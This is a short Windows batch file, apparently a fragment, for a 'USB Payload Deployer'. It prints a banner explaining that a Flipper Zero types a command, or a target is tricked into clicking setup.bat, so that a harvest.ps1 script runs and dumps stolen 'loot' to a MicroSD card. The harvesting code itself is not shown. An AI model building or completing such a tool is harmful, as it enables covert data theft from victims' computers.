@echo off
title FU PERSON - USB Payload Deployer
color 0A
...
echo.
echo    ╔══════════════════════════════════════════════════════════╗
echo    ║  FU PERSON - USB Tri-Drive Deployer                     ║
echo    ╚══════════════════════════════════════════════════════════╝
echo.
...
echo    ║                                                          ║
echo    ║  HOW IT WORKS:                                           ║
echo    ║    A: Flipper Zero types the command (auto)                ║
echo    ║    B: Target clicks setup.bat (social eng)                ║
echo    ║    Either way: harvest.ps1 runs, dumps to MicroSD loot   ║
echo    ╚══════════════════════════════════════════════════════════╝
echo.
pause
